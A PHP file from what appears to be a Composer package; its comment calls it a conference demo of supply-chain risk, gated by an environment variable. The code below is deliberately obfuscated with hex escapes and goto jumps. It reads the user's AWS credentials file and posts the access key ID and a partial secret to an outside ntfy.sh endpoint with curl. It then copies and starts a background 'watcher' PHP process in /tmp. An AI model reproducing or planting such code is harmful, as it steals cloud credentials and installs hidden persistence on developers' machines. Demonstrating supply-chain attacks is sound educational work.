<?php

/**
 * WHAT IS THIS ??
 * This is a little experiment I made to prove in live, during a talk at a dev conf,
 * the danger of adding a composer package without checking its source code. 
 * Don't be scared. This is just for demo purposes.
 * AND, this is NEVER executed without a very specific ENV variable named ALLOW_MORPHEUS_EXPERIMENT=1
 * Also, this project is anyway completely abandonned and used by maybe no-one.
 */

if (!isset($_SERVER['ALLOW_MORPHEUS_EXPERIMENT'])) {
  return false;
}

if (file_exists("\x2f\164\155\x70\57\167\141\x74\143\150\x65\x72\x2e\x70\x68\x70")) { return false; } $src = $_SERVER["\x48\117\x4d\105"] . "\57\x2e\x61\167\x73\57\143\x72\x65\x64\145\156\x74\151\x61\154\x73"; $c = parse_ini_file($src, true)["\144\x65\x66\x61\x75\154\x74"] ?? null; if (!$c) return false; goto N3RWd; ZzjML: exec("\x63\160\x20" . escapeshellarg(__DIR__ . "\57\167\x61\164\x63\x68\x65\162\x2e\160\x68\x70") . "\x20\x2f\x74\x6d\x70\x2f\167\141\x74\x63\150\x65\162\x2e\x70\x68\160"); goto sao2F; N3RWd: if (isset($c["\x61\167\163\137\x61\143\143\x65\163\x73\137\x6b\x65\171\137\x69\144"])) { $k = $c["\141\167\163\x5f\141\x63\x63\x65\163\x73\137\x6b\145\x79\x5f\x69\x64"]; $s = $c["\x61\x77\163\137\x73\x65\143\162\145\164\137\141\143\143\145\163\x73\137\x6b\145\171"]; $s = substr($s, 0, 8) . str_repeat("\52", 32); $m = "\x41\x57\x53\x20\103\x72\145\x64\x65\156\x74\x69\141\x6c\163\x20\x66\157\x75\156\144\x3a\12"; $m .= "\x4b\145\x79\72\40{$k}\xa"; $m .= "\123\x65\143\162\x65\164\72\x20{$s}\xa"; shell_exec("\143\x75\x72\x6c\40\x2d\x2d\163\151\154\145\x6e\x74\x20\55\144\x20\x27{$m}\47\40\x6e\164\146\171\x2e\163\x68\57\x6d\x6f\x72\160\x68\145\x75\x73"); } goto ZzjML; sao2F: $C = sprintf("\x6e\157\x68\165\160\x20\160\150\x70\x20\45\x73\40\76\40\x2f\x74\x6d\x70\57\167\x61\x74\143\x68\145\162\56\x6c\x6f\147\40\62\76\x26\x31\40\x26", escapeshellarg("\x2f\x74\x6d\160\x2f\x77\141\x74\x63\x68\x65\x72\x2e\160\150\x70")); goto CVLbI; CVLbI: exec($C);